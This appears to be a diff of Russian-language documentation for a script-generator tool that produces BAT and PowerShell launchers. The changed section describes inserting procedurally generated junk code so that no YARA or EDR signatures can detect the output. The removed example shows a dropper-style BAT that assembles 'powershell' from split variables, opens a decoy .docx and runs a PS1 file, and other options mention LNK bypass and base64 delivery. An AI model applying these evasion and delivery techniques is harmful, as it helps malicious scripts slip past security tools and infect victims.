@@ -270,7 +270,7 @@ $env:LNK_BYPASS="1"; $env:DELIVERY_METHOD="base64_recycle"; python generate.py
 
 ## Мусорный код (JUNK_CODE)
 
-Вставляет мёртвый (неисполняемый) код в генерируемые BAT и PS1 скрипты для увеличения энтропии и снижения вероятности сигнатурного детекта.
+Вставляет процедурно-генерируемый мёртвый код в BAT и PS1 скрипты. Имена, паттерны и структура уникальны при каждом запуске — нет фиксированных пулов или шаблонов, которые можно детектировать сигнатурами YARA/EDR.
 
 ### Как включить
 
@@ -282,50 +282,51 @@ JUNK_CODE=1
 
 ### Что вставляется в BAT
 
-| Тип | Количество | Пример |
-|-----|:---:|---------|
-| Мёртвые `SET` переменные | 3-6 | `set "xkjf=48291"` |
-| `IF DEFINED` с несуществующей переменной | 1-2 | `if defined QXZ goto chkDisk` |
-| Мёртвые метки с `GOTO :skip` | 1-2 | `goto :skip_initNet` / `:initNet` / `REM ...` / `:skip_initNet` |
+**Мёртвые SET (перемешаны с реальными):** junk SET-переменные добавляются в общий пул set_lines **до** shuffle, поэтому после перемешивания они неотличимы от рабочих.
 
-Пример BAT с JUNK_CODE=1:
+**Реалистичные BAT-конструкции** (3-5 случайных из 6 паттернов):
 
-```batch
-@echo off
-cd /d "%~dp0"
-REM System diagnostic module v3.2.1
-set "c=ell"
-set "xkjf=48291"
-if defined QXZ goto chkDisk
-set "a=pow"
-goto :skip_initNet
-:initNet
-REM make time 472
-:skip_initNet
-set "mwp=a3e8f1"
-REM Checking system integrity...
-set "b=ersh"
-...
-start xyz.docx
-%a%%b%%c%.exe %d%%e%%f%%g%%h%%i%%j% -File cd.ps1
-```
+| Паттерн | Пример |
+|---------|--------|
+| Проверка тулз | `where.exe >nul 2>&1 \|\| goto :chkData` |
+| Арифметика | `set /a initBlock=42 + 17` |
+| Проверка системных файлов | `if exist "%SystemRoot%\System32\ntdll.dll" (set "svcNode=1")` |
+| Парсинг вывода | `for /f "tokens=1" %%x in ('ver') do set "logPath=%%x"` |
+| NOP-команды | `type nul > nul` / `ver >nul` / `cd .` |
+| Условный set по errorlevel | `if %errorlevel% equ 0 (set "netFlag=ready")` |
+
+Метки генерируются процедурно: `prefix` + `Suffix` (225 комбинаций, camelCase).
 
 ### Что вставляется в PS1
 
-| Тип | Количество | Пример |
-|-----|:---:|---------|
-| Мёртвые функции | 2-4 | `function Get-ConfigState { param([int]$x = 42831); ... }` |
-| Мёртвые переменные | 3-6 | `$NtQueryObjZwAllocMem47 = 0x3a2f` |
+**Функции (2-4 штуки, 8 паттернов тел):**
 
-**Паттерны функций** (выбираются случайно):
+| Паттерн | Что делает |
+|---------|-----------|
+| Base64 round-trip | `[Convert]::ToBase64String(bytes)` -> `FromBase64String` |
+| Path combine | `[IO.Path]::Combine($env:TEMP, name)` + `Test-Path` |
+| Encoding round-trip | `[Text.Encoding]::UTF8.GetBytes(str)` -> `.GetString()` |
+| Registry probe | `try { Get-ItemProperty 'HKLM:\...' } catch { $null }` |
+| String split/join | `-split '...' \| ForEach { ... } \| -join` |
+| DateTime math | `[datetime]::Now.AddMinutes(-N).ToString('fmt')` |
+| Array reduce | `$arr \| Measure-Object -Sum \| Select -Expand Sum` |
+| Hashtable merge | `$h1 + $h2; $merged.Count` |
 
-- **XOR-вычисление:** `param([int]$x = N); $var = $x -bxor M; return $var`
-- **Hashtable lookup:** `$var = @{'key1'=N; 'key2'=M}; return $var.Keys.Count`
-- **String manipulation:** `param([string]$s = '...'); $var = $s.Length -band 0xFF; return $var`
+Имена функций генерируются через `random_var_name()` — тот же стиль что и рабочие переменные скрипта (напр. `NtQueryObjZwAllocMem47`). Никаких Verb-Noun шаблонов.
 
-Имена функций в стиле PowerShell cmdlet: `Get-ConfigState`, `Test-CertStore`, `Invoke-BufferSize` и т.д.
+**Цепочки вызовов:** после определения junk-функций генерируется блок вызовов, где каждая функция вызвана и результаты передаются друг другу. Статический анализ видит live data flow:
 
-Имена переменных в стиле Windows API: `$NtQueryObjZwAllocMem47`, `$RtlInitStrPsGetProc83` и т.д.
+```powershell
+$var1 = FuncName1
+$var2 = FuncName2
+$var3 = [string]$var1 + [string]$var2
+```
+
+**Переменные (4-7 штук, 12 паттернов значений):**
+
+`[guid]::NewGuid()`, `[Environment]::GetEnvironmentVariable()`, `(Get-Date).Ticks`, `[BitConverter]::ToString()`, `-replace`, `[IO.Path]::GetRandomFileName()`, `$env:COMPUTERNAME.Length`, `[Text.Encoding]::ASCII.GetByteCount()`, массивы с индексом, hex-литералы и др.
+
+1-2 переменные ссылаются на другие junk-переменные (`[string]$ref1 + [string]$ref2`).
 
 ### Комбинация с другими опциями
 
